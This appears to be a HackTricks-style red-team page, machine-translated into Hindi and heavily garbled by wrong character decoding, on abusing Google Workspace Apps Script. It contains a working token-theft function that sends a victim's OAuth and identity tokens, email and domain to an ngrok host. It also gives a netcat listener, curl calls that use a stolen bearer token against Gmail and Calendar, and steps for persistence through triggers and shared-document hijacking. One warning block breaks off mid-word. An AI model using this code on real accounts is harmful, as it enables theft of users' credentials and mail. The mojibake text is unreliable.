# GWS - рдРрдк рд╕реНрдХреНрд░рд┐рдкреНрдЯ

<details>

<summary><strong>рдЬреАрд░реЛ рд╕реЗ рд╣реАрд░реЛ рддрдХ AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдЕрдЧрд░ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдФрд░ **рдореБрдЭреЗ** **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдХрд╛** **рдЕрдиреБрд╕рд░рдг** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** рджреНрд╡рд╛рд░рд╛ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>

## рдРрдк рд╕реНрдХреНрд░рд┐рдкреНрдЯ

рдРрдк рд╕реНрдХреНрд░рд┐рдкреНрдЯ **рд╡рд╣ рдХреЛрдб рд╣реИ рдЬреЛ рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░реЗрдЧрд╛ рдЬрдм рдПрдкреНрдк рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╕реЗ рдЬреБрдбрд╝реЗ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рд╡рд╛рд▓рд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕рдВрдкрд╛рджрдХ рдЕрдиреБрдорддрд┐ рдХреЗ рд╕рд╛рде рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рддрдХ рдкрд╣реБрдВрдЪрддрд╛ рд╣реИ** рдФрд░ **OAuth рдкреНрд░реЙрдореНрдкреНрдЯ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж**ред\
рдЗрдиреНрд╣реЗрдВ рднреА **рдорд╛рд▓рд┐рдХ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдирд┐рд╢реНрдЪрд┐рдд рд╕рдордп рдХреЗ рдмрд╛рдж рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ** (рд╕реНрдерд┐рд░рддрд╛)ред

### рдРрдк рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдмрдирд╛рдПрдВ

рдРрдк рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдмрдирд╛рдиреЗ рдХреЗ рдХрдИ рддрд░реАрдХреЗ рд╣реИрдВ, рд╣рд╛рд▓рд╛рдВрдХрд┐ рд╕рдмрд╕реЗ рд╕рд╛рдорд╛рдиреНрдп рддрд░реАрдХреЗ рд╣реИрдВ **рдХрд┐рд╕реА рднреА рдкреНрд░рдХрд╛рд░ рдХреЗ Google рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рд╕реЗ** рдФрд░ рдПрдХ **рд╕реНрд╡рддрдВрддреНрд░ рдкрд░рд┐рдпреЛрдЬрдирд╛** рдХреЗ рд░реВрдк рдореЗрдВ:

<details>

<summary>Google Docs, Sheets, рдпрд╛ Slides рд╕реЗ container-bound рдкрд░рд┐рдпреЛрдЬрдирд╛ рдмрдирд╛рдПрдВ</summary>

1. рдПрдХ Docs рджрд╕реНрддрд╛рд╡реЗрдЬрд╝, рдПрдХ Sheets рдкрдВрдЬреАрдХрд░рдг, рдпрд╛ Slides рдкреНрд░рд╕реНрддреБрддрд┐ рдЦреЛрд▓реЗрдВред
2. **Extensions** > **Google Apps Script** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВред
3. рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╕рдВрдкрд╛рджрдХ рдореЗрдВ, **Untitled project** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВред
4. рдЕрдкрдиреЗ рдкрд░рд┐рдпреЛрдЬрдирд╛ рдХреЛ рдПрдХ рдирд╛рдо рджреЗрдВ рдФрд░ **Rename** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВред

</details>

<details>

<summary>рд╕реНрд╡рддрдВрддреНрд░ рдкрд░рд┐рдпреЛрдЬрдирд╛ рдмрдирд╛рдПрдВ</summary>

Apps Script рд╕реЗ рд╕реНрд╡рддрдВрддреНрд░ рдкрд░рд┐рдпреЛрдЬрдирд╛ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП:

1. [`script.google.com`](https://script.google.com/) рдкрд░ рдЬрд╛рдПрдВред
2. **рдирдпрд╛ рдкрд░рд┐рдпреЛрдЬрдирд╛** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВред
3. рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╕рдВрдкрд╛рджрдХ рдореЗрдВ, **Untitled project** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВред
4. рдЕрдкрдиреЗ рдкрд░рд┐рдпреЛрдЬрдирд╛ рдХреЛ рдПрдХ рдирд╛рдо рджреЗрдВ рдФрд░ **Rename** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВред

</details>

<details>

<summary>Google Drive рд╕реЗ рд╕реНрд╡рддрдВрддреНрд░ рдкрд░рд┐рдпреЛрдЬрдирд╛ рдмрдирд╛рдПрдВ</summary>

1. [Google Drive](https://drive.google.com/) рдЦреЛрд▓реЗрдВред
2. **рдирдпрд╛** > **рдЕрдзрд┐рдХ** > **Google Apps Script** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВред

</details>

<details>

<summary>Google Forms рд╕реЗ container-bound рдкрд░рд┐рдпреЛрдЬрдирд╛ рдмрдирд╛рдПрдВ</summary>

1. Google Forms рдореЗрдВ рдПрдХ рдлреЙрд░реНрдо рдЦреЛрд▓реЗрдВред
2. рдЕрдзрд┐рдХ more\_vert > **рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╕рдВрдкрд╛рджрдХ** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВред
3. рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╕рдВрдкрд╛рджрдХ рдореЗрдВ, **Untitled project** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВред
4. рдЕрдкрдиреЗ рдкрд░рд┐рдпреЛрдЬрдирд╛ рдХреЛ рдПрдХ рдирд╛рдо рджреЗрдВ рдФрд░ **Rename** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВред

</details>

<details>

<summary>clasp рдХрдорд╛рдВрдб рд▓рд╛рдЗрди рдЯреВрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕реНрд╡рддрдВрддреНрд░ рдкрд░рд┐рдпреЛрдЬрдирд╛ рдмрдирд╛рдПрдВ</summary>

`clasp` рдПрдХ рдХрдорд╛рдВрдб рд▓рд╛рдЗрди рдЯреВрд▓ рд╣реИ рдЬреЛ рдЖрдкрдХреЛ рдЯрд░реНрдорд┐рдирд▓ рд╕реЗ Apps Script рдкрд░рд┐рдпреЛрдЬрдирд╛рдПрдВ рдмрдирд╛рдиреЗ, рдкреБрд▓/рдкреБрд╢ рдХрд░рдиреЗ, рдФрд░ рдбрд┐рдкреНрд▓реЙрдп рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред

рдЕрдзрд┐рдХ рд╡рд┐рд╡рд░рдг рдХреЗ рд▓рд┐рдП [Command Line Interface using `clasp` guide](https://developers.google.com/apps-script/guides/clasp) рджреЗрдЦреЗрдВред

</details>

## рдРрдк рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╕реНрдерд┐рддрд┐ <a href="#create-using-clasp" id="create-using-clasp"></a>

### рдРрдк рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЗ рд╕рд╛рде Google Sheet рдмрдирд╛рдПрдВ

рдПрдХ рдРрдк рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдмрдирд╛рдиреЗ рдХреА рд╢реБрд░реБрдЖрдд рдХрд░реЗрдВ, рдЗрд╕ рд╕реНрдерд┐рддрд┐ рдХреЗ рд▓рд┐рдП рдореЗрд░реА рд╕рд┐рдлрд╛рд░рд┐рд╢ рд╣реИ рдХрд┐ рдЖрдк рдПрдХ Google Sheet рдмрдирд╛рдПрдВ рдФрд░ **`Extensions > App Scripts`** рдкрд░ рдЬрд╛рдПрдВ, рдпрд╣ рдЖрдкрдХреЗ рд▓рд┐рдП рдПрдХ **рдирдП рдРрдк рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЦреЛрд▓реЗрдЧрд╛ рдЬреЛ рд╢реАрдЯ рд╕реЗ рдЬреБрдбрд╝рд╛ рд╣реЛрдЧрд╛**ред

### рдЯреЛрдХрди рд▓реАрдХ

OAuth рдЯреЛрдХрди рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ **`рд╕реЗрд╡рд╛рдПрдВ +` рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░рдХреЗ рд╕реНрдХреЛрдк рдЬреЛрдбрд╝рдиреЗ рд╣реЛрдВрдЧреЗ**:

* **AdminDirectory**: рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдФрд░ рд╕рдореВрд╣реЛрдВ рддрдХ рдкрд╣реБрдВрдЪ (рдпрджрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдкрд╛рд╕ рдкрд░реНрдпрд╛рдкреНрдд рдЕрдиреБрдорддрд┐ рд╣реИ)
* **Gmail**: Gmail рдбреЗрдЯрд╛ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП
* **Drive**: Drive рдбреЗрдЯрд╛ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП
* **Google Sheets API**: рддрд╛рдХрд┐ рдЯреНрд░рд┐рдЧрд░ рдХреЗ рд╕рд╛рде рдХрд╛рдо рдХрд░реЗ

рдЖрд╡рд╢реНрдпрдХ **рд╕реНрдХреЛрдкреНрд╕ рдХреЛ рдмрджрд▓рдиреЗ** рдХреЗ рд▓рд┐рдП рдЖрдк рдкрд░рд┐рдпреЛрдЬрдирд╛ рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдореЗрдВ рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд╕рдХреНрд╖рдо рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: **`рд╕рдВрдкрд╛рджрдХ рдореЗрдВ "appsscript.json" рдореИрдирд┐рдлреЗрд╕реНрдЯ рдлрд╝рд╛рдЗрд▓ рджрд┐рдЦрд╛рдПрдВ`**ред

{% code overflow="wrap" %}
```javascript
function getToken() {
var userEmail = Session.getActiveUser().getEmail();
var domain = userEmail.substring(userEmail.lastIndexOf("@") + 1);
var oauthToken = ScriptApp.getOAuthToken();
var identityToken = ScriptApp.getIdentityToken();

// Data json
data = {
"oauthToken": oauthToken,
"identityToken": identityToken,
"email": userEmail,
"domain": domain
}

// Send data
makePostRequest(data);

// Use the APIs, if you don't even if the have configured them in appscript.json the App script won't ask for permissions

// To ask for AdminDirectory permissions
var pageToken = "";
page = AdminDirectory.Users.list({
domain: domain,  // Use the extracted domain
orderBy: 'givenName',
maxResults: 100,
pageToken: pageToken
});

// To ask for gmail permissions
var threads = GmailApp.getInboxThreads(0, 10);

// To ask for drive permissions
var files = DriveApp.getFiles();
}


function makePostRequest(data) {
var url = 'http://5.tcp.eu.ngrok.io:12027';

var options = {
'method' : 'post',
'contentType': 'application/json',
'payload' : JSON.stringify(data)
};

try {
UrlFetchApp.fetch(url, options);
} catch (e) {
Logger.log("Error making POST request: " + e.toString());
}
}
```
{% endcode %}

рдЕрдиреБрд░реЛрдз рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдмрд╕ рдпрд╣ рд░рди рдХрд░ рд╕рдХрддреЗ рд╣ред
```bash
ngrok tcp 4444
nc -lv 4444 #macOS
```
Permissions requested to execute the App Script:

<figure><img src="../../../.gitbook/assets/image (145).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
рдПрдХ рдмрд╛рд╣реНрдп рдЕрдиреБрд░реЛрдз рдХреЗ рд╕рд╛рде OAuth рдкреНрд░реЙрдореНрдкреНрдЯ рднреА **рдмрд╛рд╣реНрдп рдЕрдВрддрдмрд┐рдВрджреБ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреА рдЕрдиреБрдорддрд┐** рдХреЗ рд▓рд┐рдП рдкреВрдЫреЗрдЧрд╛ред
{% endhint %}

### рдЯреНрд░рд┐рдЧрд░ рдмрдирд╛рдПрдВ

рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдкрдврд╝рдиреЗ рдХреЗ рдмрд╛рдж, **тП░ рдЯреНрд░рд┐рдЧрд░реНрд╕** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ рдЯреНрд░рд┐рдЧрд░ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдПред **`getToken`** рдХреЛ **рдлрд╝рдВрдХреНрд╢рди** рдХреЗ рд░реВрдк рдореЗрдВ рдЪреБрдиреЗрдВ, рдбрд┐рдкреНрд▓реЙрдпрдореЗрдВрдЯ рдореЗрдВ **`Head`** рдХреЛ рдЪреБрдиреЗрдВ, рдЗрд╡реЗрдВрдЯ рд╕реНрд░реЛрдд рдореЗрдВ **`From spreadsheet`** рдХреЛ рдЪреБрдиреЗрдВ рдФрд░ рдЗрд╡реЗрдВрдЯ рдкреНрд░рдХрд╛рд░ рдореЗрдВ **`On open`** рдпрд╛ **`On edit`** (рдЖрдкрдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛рдиреБрд╕рд╛рд░) рдЪреБрдиреЗрдВ рдФрд░ рд╕реЗрд╡ рдХрд░реЗрдВред

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрджрд┐ рдЖрдк рдХреБрдЫ рдбреАрдмрдЧ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ рдЖрдк **рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЗ рд░рдиреНрд╕ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрди рдЯреИрдм рдореЗрдВ** рдЬрд╛рдВрдЪ рд╕рдХрддреЗ рд╣реИрдВред

### рд╕рд╛рдЭрд╛ рдХрд░рдирд╛

**рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╕реНрдХреНрд░рд┐рдкреНрдЯ** рдХреЛ **рдЯреНрд░рд┐рдЧрд░** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреАрдбрд╝рд┐рдд рдХреЛ **рд╕рдВрдкрд╛рджрдХ рдПрдХреНрд╕реЗрд╕** рдХреЗ рд╕рд╛рде рдХрдиреЗрдХреНрдЯ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред

{% hint style="success" %}
**рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╕реНрдХреНрд░рд┐рдкреНрдЯ** рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЧрдпрд╛ **рдЯреЛрдХрди** **рдЯреНрд░рд┐рдЧрд░ рдХреЗ рдирд┐рд░реНрдорд╛рддрд╛** рдХрд╛ рд╣реЛрдЧрд╛, рднрд▓реЗ рд╣реА рдлрд╝рд╛рдЗрд▓ рдХреЛ рдЕрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рджреНрд╡рд╛рд░рд╛ рд╕рдВрдкрд╛рджрдХ рдХреЗ рд░реВрдк рдореЗрдВ рдЦреЛрд▓рд╛ рдЧрдпрд╛ рд╣реЛред
{% endhint %}

### Shared With Me рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ

{% hint style="danger" %}
рдпрджрд┐ рдХреЛрдИ рдЖрдкрдХреЗ рд╕рд╛рде рдПрдХ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рд╕рд╛рдЭрд╛ рдХрд░рддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдФрд░ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХрд╛ рдЯреНрд░рд┐рдЧрд░ рд╣реИ рдЬреЛ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЗ **Head** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ (рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдбрд┐рдкреНрд▓реЙрдпрдореЗрдВрдЯ рдирд╣реАрдВ), рддреЛ рдЖрдк рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдЪреЛрд░реА рдЯреЛрдХрди рдлрд╝рдВрдХреНрд╢рди рдЬреЛрдбрд╝рдирд╛), рдЗрд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ **рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рдЙрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдЬрд┐рд╕рдиреЗ рдЖрдкрдХреЗ рд╕рд╛рде рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рд╕рд╛рдЭрд╛ рдХрд┐рдпрд╛ рдерд╛**! (рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдорд╛рд▓рд┐рдХ рдХрд╛ OAuth рдЯреЛрдХрди рдЬрдм рдЯреНрд░рд┐рдЧрд░ рдмрдирд╛рдпрд╛ рдЧрдпрд╛ рдерд╛ рддреЛ рдЙрд╕рдХреЗ рдПрдХреНрд╕реЗрд╕ рд╕реНрдХреЛрдкреНрд╕ рд╣реЛрдВрдЧреЗ рдЬреЛ рджрд┐рдП рдЧрдП рдереЗ)ред

**рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЗ рдирд┐рд░реНрдорд╛рддрд╛ рдХреЛ рдПрдХ рд╕реВрдЪрдирд╛ рднреЗрдЬреА рдЬрд╛рдПрдЧреА рдЬрд┐рд╕рдореЗрдВ рдЗрд╕рдХрд╛ рд╕рдВрдХреЗрдд рдорд┐рд▓реЗрдЧрд╛ рдХрд┐ рдХрд┐рд╕реА рдиреЗ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд┐рдпрд╛ рд╣реИ** (рдПрд▓рд░реНрдЯ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП рдЬреАрдореЗрд▓ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдХреНрдпрд╛ рд╕реЛрдЪрддреЗ рд╣реИрдВ?)
{% endhint %}

{% hint style="success" %}
рдпрджрд┐ рдХреЛрдИ **рд╣рдорд▓рд╛рд╡рд░ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЗ рд╕реНрдХреЛрдкреНрд╕ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд** рдХрд░рддрд╛ рд╣реИ рддреЛ рдЕрдкрдб
```bash
curl -X GET "https://www.googleapis.com/gmail/v1/users/<user@email>/messages" \
-H "Authorization: Bearer <token>"
```
{% endcode %}

рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ рдХреИрд▓реЗрдВрдбрд░ рд╕реВрдЪреА:
```bash
curl -H "Authorization: Bearer $OAUTH_TOKEN" \
-H "Accept: application/json" \
"https://www.googleapis.com/calendar/v3/users/me/calendarList"
```
## App Script рдХреЗ рд░реВрдк рдореЗрдВ рд╕реНрдерд┐рд░рддрд╛

рд╕реНрдерд┐рд░рддрд╛ рдХреЗ рд▓рд┐рдП рдПрдХ рд╡рд┐рдХрд▓реНрдк рдпрд╣ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ **рдПрдХ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдмрдирд╛рдПрдВ рдФрд░ getToken рдХреЗ рд▓рд┐рдП рдПрдХ рдЯреНрд░рд┐рдЧрд░ рдЬреЛрдбрд╝реЗрдВ** рдФрд░ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдХреЛ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рд╕рд╛рде рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рддрд╛рдХрд┐ рд╣рд░ рдмрд╛рд░ рдЬрдм рд╣рдорд▓рд╛рд╡рд░ рдлрд╝рд╛рдЗрд▓ рдЦреЛрд▓рддрд╛ рд╣реИ рддреЛ рд╡рд╣ **рд╡рд┐рдХреНрдЯрд┐рдо рдХрд╛ рдЯреЛрдХрди рдирд┐рдХрд╛рд▓рддрд╛ рд╣реИред**

рдПрдХ App Script рдмрдирд╛рдирд╛ рдФрд░ рдЗрд╕реЗ рд╣рд░ X рд╕рдордп (рдЬреИрд╕реЗ рд╣рд░ рдорд┐рдирдЯ, рдШрдВрдЯрд╛, рджрд┐рди...) рдХреЗ рд▓рд┐рдП рдЯреНрд░рд┐рдЧрд░ рдХрд░рдирд╛ рднреА рд╕рдВрднрд╡ рд╣реИред рдЬреЛ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рд╣реИ рдЬрд┐рд╕рдиреЗ **рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдпрд╛ рдПрдХ рд╡рд┐рдХреНрдЯрд┐рдо рдХреЗ рд╕рддреНрд░ рдХреЛ рдХрдВрдкреНрд░реЛрдорд╛рдЗрдЬрд╝ рдХрд┐рдпрд╛ рд╣реИ рд╡рд╣ рдПрдХ App Script рд╕рдордп рдЯреНрд░рд┐рдЧрд░ рд╕реЗрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рд╣рд░ рджрд┐рди рдПрдХ рдмрд╣реБрдд рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реА OAuth рдЯреЛрдХрди рд▓реАрдХ рдХрд░ рд╕рдХрддрд╛ рд╣реИ**:

рдПрдХ App Script рдмрдирд╛рдПрдВ, Triggers рдкрд░ рдЬрд╛рдПрдВ, Add Trigger рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ, рдФрд░ event source рдХреЗ рд░реВрдк рдореЗрдВ Time-driven рдЪреБрдиреЗрдВ рдФрд░ рдЙрди рд╡рд┐рдХрд▓реНрдкреЛрдВ рдХреЛ рдЪреБрдиреЗрдВ рдЬреЛ рдЖрдкрдХреЛ рдЕрдЪреНрдЫреЗ рд╕реЗ рдЕрдиреБрдХреВрд▓ рд╣реИрдВ:

<figure><img src="../../../.gitbook/assets/image (147).png" alt=""><figcaption></figcaption></figure>

{% hint style="danger" %}
рдЗрд╕рд╕реЗ рдПрдХ рд╕реБрд░рдХреНрд╖рд╛ рдЪреЗрддрд╛рд╡рдиреА рдИрдореЗрд▓ рдФрд░ рдПрдХ рдкреБрд╢ рд╕рдВрджреЗрд╢ рдЖрдкрдХреЗ рдореЛрдмрд╛рдЗрд▓ рдкрд░ рдЗрд╕рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд╕реВрдЪрд┐рдд рдХрд░реЗрдЧрд╛ред
{% endhint %}

### рд╕рд╛рдЭрд╛ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдЕрдирд╕рддреНрдп рдкреНрд░реЙрдореНрдкреНрдЯ рдмрд╛рдпрдкрд╛рд╕

рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, рдпрджрд┐ рдХреЛрдИ рдЖрдкрдХреЗ рд╕рд╛рде рдПрдХ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рд╕рд╛рдЭрд╛ рдХрд░рддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ **рд╕рдВрдкрд╛рджрдХ рдПрдХреНрд╕реЗрд╕** рд╣реИ, рддреЛ рдЖрдк **рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдХреЗ рдЕрдВрджрд░ App Scripts рдЙрддреНрдкрдиреНрди** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ **рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдХрд╛ рдорд╛рд▓рд┐рдХ (рдирд┐рд░реНрдорд╛рддрд╛) App Script рдХрд╛ рдорд╛рд▓рд┐рдХ рд╣реЛрдЧрд╛**ред

{% hint style="warning" %}
рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ, рдХрд┐ **рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдХреЗ рдирд┐рд░реНрдорд╛рддрд╛ рдХреЛрдИ рднреА App Script рдХреЗ рдирд┐рд░реНрдорд╛рддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдкреНрд░рдХрдЯ рд╣реЛрдЧрд╛** рдЬреЛ рднреА рд╕рдВрдкрд╛рджрдХ рдПрдХреНрд╕реЗрд╕ рдХреЗ рд╕рд╛рде рдЙрд╕рдХреЗ рдЕрдВрджрд░ рдмрдирд╛рддрд╛ рд╣реИред

рдпрд╣ рднреА рдорддрд▓рдм рд╣реИ рдХрд┐ **App Script рдХреЛ Workspace рдкрд░рд┐рд╡реЗрд╢ рджреНрд╡рд╛рд░рд╛ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдорд╛рдирд╛ рдЬрд╛рдПрдЧрд╛** рдЬрд┐рд╕рдХрд╛ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдХрд╛ рдирд┐рд░реНрдорд╛рддрд╛ рд╣реИред
{% endhint %}

{% hint style="danger" %}
